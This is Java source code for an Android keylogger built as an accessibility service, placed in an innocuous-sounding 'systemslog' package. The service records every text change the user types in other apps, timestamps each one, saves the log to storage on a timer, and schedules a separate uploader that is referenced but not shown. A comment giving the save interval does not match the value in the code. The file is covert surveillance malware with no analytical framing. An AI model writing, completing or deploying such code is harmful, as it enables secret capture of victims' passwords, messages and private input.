package com.example.systemslog;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.content.Intent;
import android.os.Handler;
import android.util.Log;
import java.text.SimpleDateFormat;
import java.util.*;

public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private StringBuilder logBuffer = new StringBuilder();
    private String lastText = "";

    private Handler handler = new Handler();
    private long sessionStart;
    private final long INTERVAL = 3 * 60 * 1000; // 15 minutes in milliseconds

    private final Runnable saveRunnable = new Runnable() {
        @Override
        public void run() {
            flushLogs();
            handler.postDelayed(this, INTERVAL);
        }
    };

    @Override
    public void onServiceConnected() {
        sessionStart = System.currentTimeMillis();
        handler.postDelayed(saveRunnable, INTERVAL);
        LogUploader.scheduleUploader(this); // start upload schedule
        Log.d(TAG, "✅ KeyloggerService connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String currentText = "";
            if (event.getText() != null && !event.getText().isEmpty()) {
                currentText = event.getText().get(0).toString();
            }
            String delta = getDifference(lastText, currentText);
            if (!delta.isEmpty()) {
                logBuffer.append(getTimestamp()).append(" → ").append(delta).append("\n");
                lastText = currentText;
            }
        }
    }

    private String getDifference(String oldStr, String newStr) {
        int minLen = Math.min(oldStr.length(), newStr.length());
        int i = 0;
        while (i < minLen && oldStr.charAt(i) == newStr.charAt(i)) i++;
        if (newStr.length() > oldStr.length()) {
            return newStr.substring(i);
        } else if (oldStr.length() > newStr.length()) {
            return "[DEL]";
        }
        return "";
    }

    private void flushLogs() {
        long timestamp = System.currentTimeMillis();
        String data = logBuffer.length() == 0 ? "No log found" : logBuffer.toString();
        FileManager.saveLog(this, data, timestamp);
        logBuffer.setLength(0);
    }

    private String getTimestamp() {
        return new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
    }

    @Override
    public void onInterrupt() {}
}
